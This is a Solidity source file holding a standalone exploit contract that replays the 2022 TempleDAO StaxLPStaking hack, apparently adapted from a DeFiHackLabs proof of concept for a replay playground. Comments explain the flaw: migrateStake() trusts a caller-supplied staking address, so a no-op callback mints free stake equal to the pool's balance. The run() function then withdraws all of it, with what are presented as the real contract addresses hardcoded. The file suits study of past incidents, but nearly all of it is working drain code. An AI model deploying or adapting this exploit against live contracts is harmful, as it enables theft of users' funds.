// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-Templedao).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract:
// `ContractTest` itself exposes the no-op `migrateWithdraw(address,uint256)`
// callback, and `address(this)` is passed as `oldStaking` to `migrateStake`.
// There is therefore no standalone contract to deploy. This file is a faithful,
// self-contained copy of that inline attack so the playground can deploy it and
// record `run()`. Logic and constants are copied verbatim from
// evm-hack-registry/2022-10-Templedao_exp/test/Templedao_exp.sol.
//
// Root cause: StaxLPStaking.migrateStake() is `external` with no access control,
// takes a caller-supplied `oldStaking`, and unconditionally credits the caller
// with `amount` of stake via _applyStake() after the (unverified) callback.
// Passing a fake oldStaking whose migrateWithdraw() is a no-op therefore mints
// free stake equal to the pool's entire token balance, which is then withdrawn.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IStaxLPStaking {
    function migrateStake(address oldStaking, uint256 amount) external;
    function withdrawAll(bool claim) external;
}

contract TempledaoDrain {
    IERC20 private constant xFraxTempleLP = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
    IStaxLPStaking private constant StaxLPStaking = IStaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);

    function run() external {
        uint256 lpbalance = xFraxTempleLP.balanceOf(address(StaxLPStaking));

        // Perform migrateStake() — passes address(this) as the fake oldStaking;
        // the no-op migrateWithdraw below is the callback (returns instantly,
        // no tokens move), yet _applyStake credits the caller with `lpbalance`.
        StaxLPStaking.migrateStake(address(this), lpbalance);

        // Perform withdrawAll() — pulls the entire pool balance out as real tokens.
        StaxLPStaking.withdrawAll(false);
    }

    // The fake "old staking" callback: an empty no-op stub. migrateStake trusts
    // it to deliver `amount` of stakingToken, but it returns having moved nothing.
    function migrateWithdraw(address, uint256) external {}
}
